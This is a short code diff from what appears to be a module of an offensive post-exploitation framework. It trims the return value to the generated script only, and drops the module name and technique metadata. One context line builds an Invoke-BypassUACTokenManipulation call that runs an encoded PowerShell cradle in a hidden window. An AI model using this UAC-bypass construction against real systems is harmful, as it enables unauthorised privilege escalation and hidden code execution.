@@ -169,9 +169,5 @@ class Module(object):
         scriptEnd = "Invoke-BypassUACTokenManipulation -Arguments \"-w 1 -enc %s\"" % (encodedCradle)
         script += scriptEnd
 
-        moduleName = self.info['Name']
-        techniques = self.info['Techniques']
-        software = self.info['Software']
-
-        return script, moduleName, techniques, software
+        return script
 
